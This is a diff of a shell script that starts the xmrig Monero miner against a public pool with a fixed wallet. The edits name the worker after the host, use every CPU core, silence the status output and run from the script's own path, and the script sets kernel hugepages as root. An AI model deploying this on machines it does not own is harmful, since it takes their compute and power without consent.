@@ -4,27 +4,27 @@ POOL="stratum+tcp://pool.supportxmr.com"
 # PORTS: 3333, 4444, 5555, 7777
 PORT=5555
 ADDR="42ATuGxCfG2eNvEG1WsSq83kptkcGQdDYerSDTg5pA8W5Fu4vyjzpfXFSojgZpoCQkeiFn87jDWS1WbgnPS25fVmR6sZ6CX"
-WORKER="Azazoth"
-THREADS="56"
+WORKER="$(hostname)"
+THREADS="$(nproc)"
 HUGEPAGES=1
 TYPE="linux/cpu"
 # MINER: xmrig minerd
 MINER="xmrig"
+PP=$(dirname `realpath $0`)
 
 if [ $HUGEPAGES -eq 1 ]
   then
 	echo 128 > /proc/sys/vm/nr_hugepages
 fi
 sysctl -w vm.nr_hugepages=128
-#echo "./xmrig -o ${POOL}:${PORT} -u ${ADDR}.${WORKER} -t${THREADS}"
 
 if [ "${TYPE}" == "linux/cpu" ]
 then
    if [ "${MINER}" == "minerd" ] || [ "${MINER}" == "xmrig" ]
     then
-	echo "POOL:  $POOL"
-	echo "MINER: $MINER"
-	./miners/${TYPE}/${MINER}/${MINER} -o ${POOL}:${PORT} -u ${ADDR}.${WORKER} -p ${WORKER} -t${THREADS}
+	#echo "POOL:  $POOL"
+	#echo "MINER: $MINER"
+	${PP}/miners/${TYPE}/${MINER}/${MINER} -o ${POOL}:${PORT} -u ${ADDR}.${WORKER} -p ${WORKER} -t${THREADS}
     else
 	echo "Miner not implemented"
     fi
